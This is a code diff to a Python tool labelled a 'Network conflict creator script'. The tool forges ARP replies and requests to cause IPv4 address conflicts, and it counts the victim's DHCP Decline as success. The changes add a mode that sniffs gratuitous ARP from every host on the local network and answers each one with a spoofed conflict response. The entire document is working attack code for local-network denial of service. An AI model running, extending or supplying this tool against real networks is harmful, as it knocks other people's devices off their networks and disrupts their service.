@@ -58,13 +58,14 @@ Base.check_platform()
 parser = ArgumentParser(description='Network conflict creator script')
 
 parser.add_argument('-i', '--interface', type=str, help='Set interface name for listen and send packets')
-parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', required=True)
+parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
 parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
 
 parser.add_argument('-a', '--answers', action='store_true', help='Send only ARP answers')
 parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests')
 parser.add_argument('-p', '--packets', type=int, help='Number of ARP answer packets (default: 10)', default=10)
 parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
+parser.add_argument('-e', '--exit', action='store_true', help='Exit on success')
 
 args = parser.parse_args()
 # endregion
@@ -103,127 +104,156 @@ if _current_mac_address is None:
 
 # region Set target IP and MAC address
 _target_ip_address = None
-if Base.ip_address_validation(args.target_ip):
-    _target_ip_address = args.target_ip
-else:
-    Base.print_error("Wrong target IP address: ", args.target_ip)
-    exit(1)
+if args.target_ip is not None:
+    if Base.ip_address_validation(args.target_ip):
+        _target_ip_address = args.target_ip
+    else:
+        Base.print_error("Wrong target IP address: ", args.target_ip)
+        exit(1)
 
 _target_mac_address = None
-if args.target_mac is not None:
-    _target_mac_address = args.target_mac
-else:
-    Base.print_info("Get MAC address of IP: ", _target_ip_address)
-    _target_mac_address = ArpScan.get_mac_address(_current_network_interface, _target_ip_address)
-    if _target_mac_address == "ff:ff:ff:ff:ff:ff":
-        Base.print_error("Could not find device MAC address with IP address: ", _target_ip_address)
-        exit(1)
+if args.target_ip is not None:
+    if args.target_mac is not None:
+        _target_mac_address = args.target_mac
     else:
-        Base.print_success("Find target: ", _target_ip_address + " (" + _target_mac_address + ")")
+        Base.print_info("Get MAC address of IP: ", _target_ip_address)
+        _target_mac_address = ArpScan.get_mac_address(_current_network_interface, _target_ip_address)
+        if _target_mac_address == "ff:ff:ff:ff:ff:ff":
+            Base.print_error("Could not find device MAC address with IP address: ", _target_ip_address)
+            exit(1)
+        else:
+            Base.print_success("Find target: ", _target_ip_address + " (" + _target_mac_address + ")")
 # endregion
 
 
 # region Send ARP reply packets
-def send_arp_reply(request):
+def reply(request):
     global _target_ip_address
     global _target_mac_address
     global _make_conflict
     global _arp_response
     global _sock
+    global _arp
     global args
 
     try:
         if not args.answers and not args.requests:
             if 'ARP' in request.keys():
-                if request['ARP']['sender-ip'] == _target_ip_address and \
-                        request['ARP']['sender-mac'] == _target_mac_address:
-                    Base.print_info("Send IPv4 Address Conflict ARP response to: ",
-                                    _target_ip_address + " (" + _target_mac_address + ")")
-                    _make_conflict = False
-                    _sock.send(_arp_response)
+                if _target_ip_address is not None:
+                    if request['ARP']['sender-ip'] == _target_ip_address and \
+                            request['ARP']['sender-mac'] == _target_mac_address:
+                        Base.print_info("Send IPv4 Address Conflict ARP response to: ",
+                                        _target_ip_address + " (" + _target_mac_address + ")")
+                        _make_conflict = False
+                        _sock.send(_arp_response)
+                else:
+                    if request['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and request['ARP']['opcode'] == 1 and \
+                            request['ARP']['sender-ip'] == request['ARP']['target-ip']:
+                        Base.print_info("Sniff Gratuitous ARP for ",
+                                        request['ARP']['sender-ip'] + " (" + request['Ethernet']['source'] + ")")
+                        arp_response = _arp.make_response(ethernet_src_mac=_current_mac_address,
+                                                          ethernet_dst_mac=request['Ethernet']['source'],
+                                                          sender_mac=_current_mac_address,
+                                                          sender_ip=request['ARP']['sender-ip'],
+                                                          target_mac=request['Ethernet']['source'],
+                                                          target_ip=request['ARP']['sender-ip'])
+                        Base.print_info("Send IPv4 Address Conflict ARP response to: ",
+                                        request['ARP']['sender-ip'] + " (" + request['Ethernet']['source'] + ")")
+                        _sock.send(arp_response)
 
         if 'DHCP' in request.keys():
             if request['DHCP'][53] == 4:
-                Base.print_success("DHCP Decline from: ", _target_ip_address +
+                Base.print_success("DHCP Decline from: ", request['DHCP'][50] +
                                    " (" + request['Ethernet']['source'] + ")",
-                                   " IPv4 address conflict detection!")
-                exit(0)
+                                   " IPv4 address conflict detected!")
+                if args.exit:
+                    exit(0)
 
     except KeyboardInterrupt:
         _sock.close()
         Base.print_info("Exit")
         exit(0)
+
+    except TypeError:
+        pass
 # endregion
 
 
 # region ARP Sniffer
 def arp_sniffer():
-    Base.print_info("Sniff ARP or DHCP request from: ", str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
-    Sniff.start(protocols=['ARP', 'IP', 'UDP', 'DHCP'], prn=send_arp_reply,
-                filters={"Ethernet": {"source": _target_mac_address}})
+    if _target_ip_address is not None:
+        Base.print_info("Sniff ARP or DHCP requests from: ", str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
+        Sniff.start(protocols=['ARP', 'IP', 'UDP', 'DHCP'], prn=reply,
+                    filters={"Ethernet": {"source": _target_mac_address}})
+    else:
+        Base.print_info("Sniff ARP or DHCP requests ...")
+        Sniff.start(protocols=['ARP', 'IP', 'UDP', 'DHCP'], prn=reply)
 # endregion
 
 
 # region Main function
 if __name__ == "__main__":
     try:
-        # region Make ARP request and response
-        _arp_response = _arp.make_response(ethernet_src_mac=_current_mac_address,
-                                           ethernet_dst_mac=_target_mac_address,
-                                           sender_mac=_current_mac_address,
-                                           sender_ip=_target_ip_address,
-                                           target_mac=_target_mac_address,
-                                           target_ip=_target_ip_address)
-
-        _arp_request = _arp.make_request(ethernet_src_mac=_current_mac_address,
-                                         ethernet_dst_mac="33:33:00:00:00:01",
-                                         sender_mac=_current_mac_address,
-                                         sender_ip=_target_ip_address,
-                                         target_mac="00:00:00:00:00:00",
-                                         target_ip=Base.get_netiface_random_ip(_current_network_interface))
-        # endregion
-
-        # region Start ARP sniffer
-        TM.add_task(arp_sniffer)
-        # endregion
-
-        # region Send only ARP reply packets
-        if args.answers:
-            Base.print_info("Send only ARP response packets to: ",
-                            str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
-            for _ in range(_number_of_packets):
-                _sock.send(_arp_response)
-                sleep(0.5)
-
-            _sock.close()
-        # endregion
-
-        # region Send only ARP request packets
-        elif args.requests:
-            Base.print_info("Send only Multicast ARP request packets to: ",
-                            str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
-            for _ in range(_number_of_packets):
-                _sock.send(_arp_request)
-                sleep(0.5)
-
-            _sock.close()
-        # endregion
-
-        # region Send broadcast ARP request packets
+        if _target_ip_address is None:
+            arp_sniffer()
         else:
-            # region Start send ARP requests
-            while _make_conflict:
-                if _current_number_of_packets == _number_of_packets:
-                    break
-                else:
-                    Base.print_info("Send Multicast ARP request to: ",
-                                    str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
-                    _sock.send(_arp_request)
-                    sleep(3)
-                    _current_number_of_packets += 1
+            # region Make ARP request and response
+            _arp_response = _arp.make_response(ethernet_src_mac=_current_mac_address,
+                                               ethernet_dst_mac=_target_mac_address,
+                                               sender_mac=_current_mac_address,
+                                               sender_ip=_target_ip_address,
+                                               target_mac=_target_mac_address,
+                                               target_ip=_target_ip_address)
+
+            _arp_request = _arp.make_request(ethernet_src_mac=_current_mac_address,
+                                             ethernet_dst_mac="33:33:00:00:00:01",
+                                             sender_mac=_current_mac_address,
+                                             sender_ip=_target_ip_address,
+                                             target_mac="00:00:00:00:00:00",
+                                             target_ip=Base.get_netiface_random_ip(_current_network_interface))
             # endregion
 
-        # endregion
+            # region Start ARP sniffer
+            TM.add_task(arp_sniffer)
+            # endregion
+
+            # region Send only ARP reply packets
+            if args.answers:
+                Base.print_info("Send only ARP response packets to: ",
+                                str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
+                for _ in range(_number_of_packets):
+                    _sock.send(_arp_response)
+                    sleep(0.5)
+
+                _sock.close()
+            # endregion
+
+            # region Send only ARP request packets
+            elif args.requests:
+                Base.print_info("Send only Multicast ARP request packets to: ",
+                                str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
+                for _ in range(_number_of_packets):
+                    _sock.send(_arp_request)
+                    sleep(0.5)
+
+                _sock.close()
+            # endregion
+
+            # region Send broadcast ARP request packets
+            else:
+                # region Start send ARP requests
+                while _make_conflict:
+                    if _current_number_of_packets == _number_of_packets:
+                        break
+                    else:
+                        Base.print_info("Send Multicast ARP request to: ",
+                                        str(_target_ip_address) + " (" + str(_target_mac_address) + ")")
+                        _sock.send(_arp_request)
+                        sleep(3)
+                        _current_number_of_packets += 1
+                # endregion
+
+            # endregion
 
     except KeyboardInterrupt:
         _sock.close()
